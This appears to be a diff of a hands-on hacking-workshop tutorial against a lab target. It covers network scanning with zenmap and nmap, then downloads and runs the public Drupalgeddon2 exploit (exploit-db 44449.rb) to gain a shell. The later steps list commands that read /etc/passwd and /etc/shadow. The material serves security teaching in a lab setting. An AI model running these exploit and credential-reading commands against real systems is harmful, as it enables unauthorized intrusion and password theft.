@@ -57,25 +57,36 @@ For this task, we will use a tool called `zenmap`. `zenmap` is a GUI (graphical 
 
 Start `zenmap` by clicking 'Applications' (top left of screen) and selecting 'Run program.' You will get a screen that looks like:
 
-![zenmap0.png](/img/zenmap0.png){:class="img-responsive"}
+![zenmap0.png](/img/zenmap0.png)
 
 In the space for 'target,' type `10.0.0.0/24`. This means that you will be scanning the network consisting of IP addresses between 10.0.0.1 and 10.0.0.254 (see [Wikipedia](https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing) for an explanation). The goal is to see which addresses actually have hosts (i.e. computers) attached to them. These are potential targets.
 
 For 'profile,' select 'Ping scan.' This means you will be sending just a few packets to each possible IP address, just to see if there's anything there. `nmap` and `zenmap` have the ability to extensively interrogate hosts to gain a great deal of info but for now, that is unnecessary overkill, so instead we will just ping scan. When ready, click the scan button. After a few seconds, you should see something like:
 
-![zenmap0.png](/img/zenmap1.png){:class="img-responsive"}
+![zenmap1.png](/img/zenmap1.png)
+
+In the left panel, there are a list of numbers that look like 10.0.0.X - these are the IPv4 addresses of the hosts that are on the network. Some of these should look familiar. Among these, you should see your internal address, and the target internal address. This list confirms that your computer can reach the target.
+
+![zenmap2.png](/img/zenmap2.png)
+
+Next, click the 'Topology' tab. A network topology, also called a network map, shows the relationship between the different hosts on a network. For our simple lab network, everything is connected to everything else, but in a more complicated real-world network, this could look super complicated - do an Internet image search for "complicated network map" for examples.
+
+In a real-world situation, an attacker would look more closely at all the different hosts to see which hosts are vulnerable, and which contain data of value. For the purpose of this workshop, we will assume that the target we were given contains what we care about. 
+
 
 # Enumerate
 
-Next, we need to figure out what is running on your target / what it even is. Is it someone's personal Macbook? A Linux based webserver in some server farm? A Windows server handling corporate email? A SCADA system controlling uranium enriching machines? Each of these will look very different and give rise to different attack vectors.
+At this point, we have achieved a superficial understanding of what is on this network. Next, we need to figure out what is running on your target / what it even is. Is it someone's personal Macbook? A Linux based webserver in some server farm? A Windows server handling corporate email? A SCADA system controlling uranium enriching machines? Each of these will look very different and give rise to different attack vectors.
 
-Nmap is a tool used for network discovery and scanning. In this case, we already know the address of our target so we will use the tool to see what is going on with the target from a network perspective. At its most basic, nmap lets us see what ports are open on the target system. 
+We used `zenmap` in the previous section, but now, we will switch to the command line tool that powers it, `nmap`. This time, rather than scan an entire network, we will focus on a single host, your target, to see what is going on with it from a network perspective. At its most basic, nmap lets us see what ports are open on the target system. 
+
+We will use `nmap` from the CLI (command line interface). On your attacker VM, click the button on the bottom bar that says "Terminal Emulator." Then, type the following:
 
 ```bash
 nmap [target internal IP] -T5 -A -sS -p20-100,5900-5910
 ```
 
-You will get output that looks similar to the following:
+This command tells nmap to scan the host at your target IP in as much detail as it can (-A), using a type of scan known as a [Syn scan](https://nmap.org/book/man-port-scanning-techniques.html), looking only at ports 20-100, and 5900-5010. Normally, an attacker wouldn't necessarily specify ports like this but we will with guilty knowledge of the lab, in the interests of time. You will get output that looks similar to the following:
 
 ```
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-07 04:30 UTC
@@ -113,19 +124,78 @@ Network Distance: 1 hop
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Ok, we see that ports 22, 80, and 3389 are open. These ports are commonly associated with SSH, HTTP and RDP. On our target system there are one or more vulnerable services on each port. We will investigate each in turn.
+Ok, we see that ports 22, 80, and 5901 are open. These ports are commonly associated with SSH, HTTP and VNC. A real world attacker would investigate each of these ports. However, for the purpose of this lab we will assume that the web application on port 80, Drupal, is the only one that is potentially vulnerable. We will investigate this in depth but first, let's determine what our goal is.
 
 ## What's our goal?
 
-Let's first see what our ultimate goal is. Remote desktop (RDP) is a service used by Windows based machines to provide GUI based interactivity over networks. The machine providing the connection typically listens on port 3389 for incoming connections, which is why we suspect (though don't know for sure yet) this machine provides the service. From your physical machine, try connecting to the machine via RDP. On Windows based hosts, type "remote desktop" into the search / run bar and fill in the blanks. For CLI, try something like:
+In a typical cyber attack, either the final goal or a necessary step towards that goal is to gain control of the target system. Once an attacker gains control, they can issue commands to the system via a GUI desktop or a text based command line. Accordingly, our goal is to gain GUI or command line control to be able to declare success in our cyber attack.
 
-```bash
-rdesktop [target external IP]
-```
+In the case of our target, we see that there is a port open for VNC, which is a protocol used to provide GUI based interactivity over networks. The machine providing the connection typically listens on ports in the 5900 range for incoming connections, which is why we suspect (though don't know for sure yet) this machine provides the service. From your physical machine, try connecting to the machine via VNC using one of the VNC tools outlined in the [Setup](#setup) section. From your physical computer, use the target's **external** IP address, and the port 5901, which we saw from the `nmap` results. 
+
+![vnc0.png](/img/vnc0.png)
 
 You should see a login screen. However, we are stopped at the gates because we don't have credentials for the box. At this point, we know there is something potentially interesting here but we don't know how interesting, or how to get that interesting stuff. For now, our goal is to answer these questions. We will do so by exploiting vulnerabilities in the services hosted by this box.
 
 # Exploit
+
+We saw from our nmap scan that the target is hosting Drupal on port 80. You should be able to view the page at http://[target internal address] **from your attacker VM** (not the browser on your physical machine). Before diving in too deep, let's briefly discuss what a website is, and what makes a website vulnerable.
+
+At their most basic level, websites display/convey information as described in a markup language called HTML (hyper text markup language). While HTML has undergone several revisions over the years, fundamentally all the fancy websites on the modern Internet still rely on this ancient markup language. Over the years, other languages and tools have developed to help in the automatic generation of HTML (e.g. PHP, Ruby) and to supplement it with capabilities not possible with just raw HTML (CSS, javascript/node). In its simplest form, HTML is served (i.e. transferred) from one computer to another using a protocol called HTTP (hyper text transfer protocol), running on so-called web servers (e.g. Apache HTTP Server, Nginx). Once the code gets to the destination computer, it is interpreted by and rendered into the things you see on your web browser (e.g. Firefox, Chrome, Safari). As you can see, even the simplest website contains many moving pieces and each is a potential vector for attack. And as with any system, even if everything else is secure, if one link breaks, the entire system is at risk.
+
+So where does Drupal fit into this picture? Drupal is a highly popular CMS (content management platform) similar in end user functionality to WordPress and Blogger, and like those platforms, Drupal has a ton of end-user functionality. It is written in a language called PHP, which generates the HTML and supporting content that eventually renders into the beautiful blogs you see. It is also designed to be easily modified and extended, so offers an extensive API and ton of features to make life better for developers.
+
+From a security perspective, the downside to such a sprawling piece of software is that it also presents a huge attack surface (i.e. points of attack). As a matter of fact Drupal is notorious for vulnerabilities both in its core code, as well as its myriad 3rd party plugins. As an attacker, this is good news. Let's start examining the Drupal instance on our target box.
+
+Because it is basically a blogging platform, Drupal must provide a way for users to publish their blogs (i.e. send content to the server). This is done via an admin interface, which in default installations of Drupal is accessible **from your attacker VM** via http://[target internal address]/user/login. Try that now. You'll get a login page but we can't do much here since we don't have credentials for this system.
+
+![drupal0.png](/img/drupal0.png)
+
+For an easy win against well-known software like Drupal, one of the first things you should do is see what exploits have been written by other people. For example, do an Internet search for "drupal vulnerabilities." At the time of this writing, some of the top matches include [Drupal core - Highly critical - Remote Code Execution - SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-001) and [Drupal : List of security vulnerabilities - CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html). If you spend enough time going through these, eventually you will come upon the following: [Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution](https://www.exploit-db.com/exploits/44449/).
+
+This page presents an actual program written in the Ruby language that will exploit the vulnerability "SA-CORE-2018-002" to allow an attacker to execute their commands on the computer hosting the Drupal website. It is outside the scope of this workshop to discuss how exactly the exploit works but all the info you need to understand can be found in the links we've looked at.
+
+As with many such attacks, there are many potential hurdles to making this work, but the main one we need to care about it version number: what version of drupal is running on the target? We know this is important because in the description of the exploit, it is clearly stated that this only works for Drupal with version < 7.58 or < 8.3.9 or < 8.4.6 or < 8.5.1. I.e., if the target is running 8.5.1, then this will probably not work.
+
+From the `nmap` scan, we saw this is some flavor of Drupal 8, but we're not sure which. Can we figure it out? In many pieces of software, there are files that explicitly state what version it is; for example: [Where does WordPress store version number?](https://wordpress.stackexchange.com/questions/8698). We might looks for files like `CHANGELOG.txt`, `VERSION.txt` or `README.txt` that sometimes answer the question directly or indirectly. And indeed, you can see such files for your target's Drupal at: 
+
+- http://[target internal address]/README.txt
+- http://[target internal address]/core/CHANGELOG.txt
+
+Unfortunately, the Drupal developers being aware of this problem decided to not include any publicly accessible version information, so at the end of the day, we don't have an easy answer. So in such a situation, the only way to see if the version allows us to run the exploit is to just try it! 
+
+We will download the exploit directly to our computers, an run it against the target. Into the terminal on your attacker VM, type the following:
+
+```bash
+cd ~
+wget https://www.exploit-db.com/download/44449.rb
+ruby 44449.rb http://[target internal address]
+```
+
+If successful, you will see something like the following:
+
+![ex0.png](/img/ex0.png)
+
+Success! What you now have is a shell (i.e. command line access) on the computer that is hosting the web server. Once an attacker gains shell access to a computer (colloquially referred to as "popping a shell"), they typically do some recon about the local system and may, depending on their goals, go about a series of actions collectively known as privilege escalation. Privilege escalation is the act of getting access to the highest level account possible to facilitate whatever actions you are doing on the system. If you can get "root" access, then you have full control of the system.
+
+In our case, we don't necessarily need root access - we just need the password for the GUI we saw earlier, which may or may not be the same password as root. First, let's see who we currently are on the system, and what we have access to by typing the following:
+
+```bash
+whoami
+cat /etc/passwd
+cat /etc/shadow
+ls -hal ~
+pwd
+ls -hal ./
+```
+
+The above commands get us some information but don't quite get us our goal.
+
+- `whoami`: your account name on this system (www-data). This determines what files you do or don't have access to.
+- `cat /etc/passwd`: file listing account names and groups. You should have access but this isn't super helpful.
+- `cat /etc/shadow`: file listing account names and password hashes. Sometimes, this contains hashed passwords which we could crack using automated tools. Unfortunately, our account does not have access.
+- `ls -hal ~`: list of files in your account's home directory. Nothing useful in this case.
+- `ls -hal ./`: list of files in the directory we are currently in. We can see if there's anything we can use to find the password.
+ 
 
 # Surveil
 
